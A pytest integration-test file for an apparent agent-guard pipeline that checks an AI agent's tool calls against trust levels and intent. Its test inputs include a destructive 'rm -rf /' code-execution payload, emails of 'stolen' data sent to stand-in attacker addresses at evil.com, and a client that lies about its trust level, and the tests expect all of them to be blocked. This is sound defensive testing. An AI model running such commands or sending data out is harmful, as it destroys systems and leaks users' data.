"""End-to-end pipeline integration tests.

Tests the full check flow: session creation → tool call check → decision.
Uses mock LLM and mock ClickHouse to avoid external dependencies.
"""

from __future__ import annotations

import json
from unittest.mock import AsyncMock, patch

import pytest

from agentshield_core.engine.pipeline import Pipeline
from agentshield_core.engine.trust.marker import TrustMarker, TrustPolicy
from agentshield_core.engine.intent.engine import IntentConsistencyEngine
from agentshield_core.engine.intent.rule_engine import RuleEngine
from agentshield_core.engine.intent.anomaly import AnomalyDetector
from agentshield_core.engine.intent.semantic import SemanticChecker
from agentshield_core.engine.permissions.dynamic import DynamicPermissionEngine
from agentshield_core.engine.trace.engine import TraceEngine
from agentshield_core.llm.client import LLMClient, LLMResponse


class MockLLMClient(LLMClient):
    """Mock LLM that returns predictable responses."""

    async def chat(self, messages, tools=None, temperature=0.0, max_tokens=4096):
        # Return a simple intent extraction response
        return LLMResponse(
            content=json.dumps(
                {
                    "intent": "summarize emails",
                    "expected_tools": ["read_email", "summarize"],
                    "sensitive_data_involved": False,
                }
            ),
            model="mock",
            usage={"prompt_tokens": 10, "completion_tokens": 10, "total_tokens": 20},
        )


@pytest.fixture
def mock_llm():
    return MockLLMClient()


@pytest.fixture
def pipeline(mock_llm):
    """Create a fully wired Pipeline with mock dependencies."""
    trust_marker = TrustMarker(TrustPolicy())
    rule_engine = RuleEngine()
    anomaly_detector = AnomalyDetector()
    semantic_checker = SemanticChecker(mock_llm)
    intent_engine = IntentConsistencyEngine(
        llm_client=mock_llm,
        rule_engine=rule_engine,
        anomaly_detector=anomaly_detector,
        semantic_checker=semantic_checker,
    )
    permission_engine = DynamicPermissionEngine()
    trace_engine = TraceEngine()
    return Pipeline(
        trust_marker=trust_marker,
        intent_engine=intent_engine,
        permission_engine=permission_engine,
        trace_engine=trace_engine,
    )


class TestPipelineE2E:
    """Full pipeline end-to-end tests."""

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_safe_tool_call_allowed(self, mock_insert, pipeline):
        """A safe tool call matching the intent should be ALLOWED."""
        session_id, trace_id = await pipeline.create_session(
            user_message="Summarize my emails",
            agent_id="test-agent",
        )
        assert session_id
        assert trace_id

        result = await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="summarize",
            tool_params={"text": "Email content here"},
            source_id="user_input",
        )
        assert result.action == "ALLOW"
        assert result.trace_id == trace_id

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_dangerous_tool_blocked_in_external_context(self, mock_insert, pipeline):
        """send_email should be BLOCKED when processing external data."""
        session_id, trace_id = await pipeline.create_session(
            user_message="Process incoming email",
            agent_id="test-agent",
        )

        result = await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="send_email",
            tool_params={"to": "someone@evil.com", "body": "forwarded"},
            source_id="email/external",  # EXTERNAL trust level
        )
        assert result.action == "BLOCK"

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_code_exec_blocked_in_untrusted_context(self, mock_insert, pipeline):
        """execute_code should be BLOCKED when data is UNTRUSTED."""
        session_id, _ = await pipeline.create_session(
            user_message="Check file",
            agent_id="test-agent",
        )

        result = await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="execute_code",
            tool_params={"code": "import os; os.system('rm -rf /')"},
            source_id="unknown",  # UNTRUSTED
        )
        assert result.action == "BLOCK"

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_invalid_client_trust_level_ignored(self, mock_insert, pipeline):
        """Invalid client_trust_level should not crash, server decides."""
        session_id, _ = await pipeline.create_session(
            user_message="Test",
            agent_id="test-agent",
        )

        result = await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="summarize",
            tool_params={"text": "hello"},
            source_id="user_input",
            client_trust_level="INVALID_LEVEL",
        )
        # Should not crash, should process normally
        assert result.action in ("ALLOW", "BLOCK", "REQUIRE_CONFIRMATION")

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_stateless_mode_auto_creates_session(self, mock_insert, pipeline):
        """Calling check without session should auto-create one."""
        result = await pipeline.check_tool_call(
            session_id="nonexistent-session",
            tool_name="summarize",
            tool_params={"text": "hello"},
            source_id="user_input",
        )
        assert result.action in ("ALLOW", "BLOCK", "REQUIRE_CONFIRMATION")
        assert result.trace_id  # Should have a trace

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_tool_history_tracked(self, mock_insert, pipeline):
        """Tool call history should accumulate across calls in the same session."""
        session_id, _ = await pipeline.create_session(
            user_message="Process data",
            agent_id="test-agent",
        )

        for i in range(3):
            await pipeline.check_tool_call(
                session_id=session_id,
                tool_name="summarize",
                tool_params={"text": f"item {i}"},
                source_id="user_input",
            )

        ctx = pipeline._sessions[session_id]
        assert len(ctx.tool_call_history) == 3

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_trace_spans_recorded(self, mock_insert, pipeline):
        """Each tool call should record a trace span."""
        session_id, trace_id = await pipeline.create_session(
            user_message="Test",
            agent_id="test-agent",
        )

        await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="summarize",
            tool_params={"text": "hello"},
            source_id="user_input",
        )

        # Trace should have at least one span
        trace = pipeline._trace_engine.get_trace(trace_id)
        assert trace is not None
        assert len(trace.spans) >= 1
        assert trace.spans[0].tool_name == "summarize"

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_permission_engine_restricts_untrusted(self, mock_insert, pipeline):
        """UNTRUSTED data should restrict available tools to summarize/classify only."""
        session_id, _ = await pipeline.create_session(
            user_message="Process data",
            agent_id="test-agent",
            metadata={"agent_tools": ["send_email", "summarize", "classify", "delete_all"]},
        )

        result = await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="delete_all",
            tool_params={},
            source_id="unknown",  # UNTRUSTED
        )
        assert result.action == "BLOCK"
        assert "not permitted" in result.reason

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_client_trust_upgrade_rejected(self, mock_insert, pipeline):
        """Client claiming TRUSTED for external data should be overridden by server."""
        session_id, _ = await pipeline.create_session(
            user_message="Process email",
            agent_id="test-agent",
        )

        result = await pipeline.check_tool_call(
            session_id=session_id,
            tool_name="send_email",
            tool_params={"to": "attacker@evil.com", "body": "stolen"},
            source_id="email/external",
            client_trust_level="TRUSTED",  # Client lies
        )
        # Server should use EXTERNAL (from source mapping), not TRUSTED
        assert result.action == "BLOCK"


class TestSessionManagement:
    """Test session lifecycle and memory management."""

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_session_eviction_on_max_capacity(self, mock_insert, pipeline):
        """Sessions should be evicted when max capacity is reached."""
        # Create many sessions
        for i in range(50):
            await pipeline.create_session(
                user_message=f"Session {i}",
                agent_id="test",
            )
        assert len(pipeline._sessions) == 50

    @pytest.mark.asyncio
    @patch("agentshield_core.storage.clickhouse.insert_span", new_callable=AsyncMock)
    async def test_expired_sessions_cleaned(self, mock_insert, pipeline):
        """Expired sessions should be removed on next create."""
        import time as t

        session_id, _ = await pipeline.create_session(user_message="Old session", agent_id="test")
        # Manually expire it
        pipeline._sessions[session_id].created_at = t.time() - 7200

        # Creating new session should trigger cleanup
        await pipeline.create_session(user_message="New session", agent_id="test")
        assert session_id not in pipeline._sessions
